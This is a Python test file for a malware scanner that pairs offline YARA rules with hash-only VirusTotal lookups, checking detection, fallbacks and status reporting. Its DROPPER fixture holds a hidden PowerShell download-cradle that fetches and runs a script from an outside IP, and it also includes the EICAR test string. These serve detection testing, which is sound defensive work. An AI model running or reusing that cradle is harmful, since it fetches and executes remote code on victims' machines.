"""YARA (offline) and VirusTotal (online, hash only) must work together: either one alone is never enough to switch the other off."""
import os

import filescan
import intel
import yara_engine

EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
DROPPER = 'powershell -nop -w hidden -enc SQBFAFgA\nIEX (New-Object Net.WebClient).DownloadString("http://1.2.3.4/a.ps1")\n'


def _run(tmp_path, name, data, kind, allow_vt=True):
    p = tmp_path / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return filescan.analyze(filescan.AnalyzeIn(path=str(p), name=name, size=p.stat().st_size, sha256="", kind=kind, allow_vt=allow_vt))


def _ids(res):
    return {f["id"] for f in res["findings"]}


def test_yara_rules_are_loaded_and_compile():
    st = yara_engine.reload()
    assert st["installed"] and st["ready"] and st["rules"] >= 19 and not st["errors"], st


def test_yara_alone_catches_the_test_file_and_a_dropper_without_internet(tmp_path, monkeypatch):
    monkeypatch.setattr(intel, "keys", lambda: {"vt": "", "nvd": ""})
    res = _run(tmp_path, "e.com", EICAR, "pe")
    assert "yara-Test_File_EICAR" in _ids(res) and res["vt"] is None
    assert "VirusTotal key not set" in res["note"]            # it says why VirusTotal did not run, it does not stay silent
    assert "yara-Script_Downloader" in _ids(_run(tmp_path, "a.ps1", DROPPER, "script"))


def test_yara_and_virustotal_both_report_on_the_same_file(tmp_path, monkeypatch):
    seen = []
    monkeypatch.setattr(intel, "keys", lambda: {"vt": "k", "nvd": ""})
    monkeypatch.setattr(intel, "_http_json", lambda url, headers, **kw: (seen.append(url) or (200, {"data": {"attributes": {
        "last_analysis_stats": {"malicious": 41, "suspicious": 1, "harmless": 0, "undetected": 20},
        "popular_threat_classification": {"suggested_threat_label": "trojan.test"}}}})))
    res = _run(tmp_path, "e.com", EICAR, "pe")
    assert {"yara-Test_File_EICAR", "vt-malware"} <= _ids(res)
    assert seen and seen[0].endswith(res["ident"]["hashes"]["sha256"])   # only the hash was sent
    assert "matched" in res["ident"]["verdict_hint"] and "41 engines" in res["ident"]["verdict_hint"]


def test_virustotal_failure_never_hides_the_yara_result(tmp_path, monkeypatch):
    monkeypatch.setattr(intel, "keys", lambda: {"vt": "k", "nvd": ""})
    for status in (429, 403, 0):
        monkeypatch.setattr(intel, "_http_json", lambda url, headers, _s=status, **kw: (_s, None))
        res = _run(tmp_path, "a.ps1", DROPPER, "script")
        assert "yara-Script_Downloader" in _ids(res) and "vt-malware" not in _ids(res) and res["note"]


def test_virustotal_off_when_not_allowed_but_yara_still_runs(tmp_path, monkeypatch):
    monkeypatch.setattr(intel, "keys", lambda: {"vt": "k", "nvd": ""})
    res = _run(tmp_path, "e.com", EICAR, "pe", allow_vt=False)
    assert "yara-Test_File_EICAR" in _ids(res) and res["vt"] is None


def test_download_result_reports_what_yara_did(tmp_path, monkeypatch):
    """The Downloads page shows 'YARA: N rules, no match' or the rule names, so the answer must carry them."""
    monkeypatch.setattr(intel, "keys", lambda: {"vt": "", "nvd": ""})
    bad = _run(tmp_path, "run.ps1", DROPPER, "script", allow_vt=False)
    assert bad["yara"]["ready"] and bad["yara"]["rules"] >= 19 and bad["yara"]["file_matches"], bad["yara"]
    clean = _run(tmp_path, "notes.txt", "meeting at 10, bring the report\n", "text", allow_vt=False)
    assert clean["yara"]["ready"] and clean["yara"]["file_matches"] == [] and clean["yara"]["hidden_matches"] == []


def test_a_picture_that_is_really_a_script_is_still_read_under_its_real_name(tmp_path, monkeypatch):
    """A held file ends in .held on disk, but it is judged under the name it was downloaded with (the Rust side passes that name)."""
    monkeypatch.setattr(intel, "keys", lambda: {"vt": "", "nvd": ""})
    res = _run(tmp_path, "run.ps1.held", DROPPER, "script", allow_vt=False)  # what happens if the real name is NOT passed
    res2 = _run(tmp_path, "run.ps1", DROPPER, "script", allow_vt=False)
    assert "dl-exec-ps" in _ids(res2)
    assert _ids(res2) >= {"dl-exec-ps"} and res["yara"]["file_matches"], "YARA reads the bytes whatever the name is"
